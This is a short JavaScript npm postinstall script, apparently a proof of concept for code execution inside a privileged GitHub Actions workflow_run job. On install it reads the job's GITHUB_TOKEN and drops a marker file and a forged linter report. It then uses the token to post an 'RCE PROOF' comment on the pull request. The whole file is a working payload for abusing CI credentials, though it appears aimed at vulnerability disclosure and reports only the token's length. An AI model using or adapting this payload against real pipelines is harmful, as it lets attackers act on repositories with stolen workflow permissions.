const fs = require('fs');
const path = require('path');
const init = process.env.INIT_CWD || process.cwd();
const token = process.env.GITHUB_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
function log(m) { try { fs.appendFileSync('/tmp/ADP_RCE_MARKER', m + '\n'); } catch (e) {} }
log('postinstall ran repo=' + repo + ' token_present=' + (token ? 'yes' : 'no') + ' token_len=' + token.length);
try {
  fs.writeFileSync(path.join(init, 'linter-report.txt'),
    'RCE_CONFIRMED_IN_POST_LINT_COMMENT token_present=' + (token ? 'yes' : 'no') +
    ' token_len=' + token.length + ' repo=' + repo + '\n');
} catch (e) { log('write_err=' + e.message); }
(async () => {
  try {
    const pr = fs.readFileSync(path.join(init, 'pr-number.txt'), 'utf8').trim();
    const r = await fetch(`https://api.github.com/repos/${repo}/issues/${pr}/comments`, {
      method: 'POST',
      headers: { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
      body: JSON.stringify({ body: '### RCE PROOF (Post Linter Report, workflow_run)\nAttacker-controlled npm postinstall executed inside the privileged job. GITHUB_TOKEN present: ' + (token ? 'yes' : 'no') + '; token length ' + token.length + '. Comment posted with pull-requests: write.' })
    });
    log('comment_status=' + r.status);
  } catch (e) { log('api_err=' + e.message); }
})();
